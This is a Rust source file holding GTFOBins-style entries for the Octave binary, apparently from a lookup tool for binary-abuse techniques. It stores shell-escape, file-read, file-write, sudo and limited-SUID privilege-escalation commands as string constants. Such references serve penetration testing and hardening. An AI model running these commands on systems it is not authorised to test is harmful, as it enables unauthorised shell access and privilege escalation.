pub static BIN_NAME: &'static str = "octave";
pub static BIN_DESC: &'static str = "The payloads are compatible with GUI.";
pub static SH_CODE: &'static str = r#"
    
    octave-cli --eval 'system("/bin/sh")'
"#;
pub static FW_CODE: &'static str = r#"
    
    octave-cli --eval 'filename = "file_to_write"; fid = fopen(filename, "w"); fputs(fid, "DATA"); fclose(fid);'
"#;
pub static FR_CODE: &'static str = r#"
    
    octave-cli --eval 'format none; fid = fopen("file_to_read"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo octave-cli --eval 'system("/bin/sh")'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which octave) .

    ./octave-cli --eval 'system("/bin/sh")'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
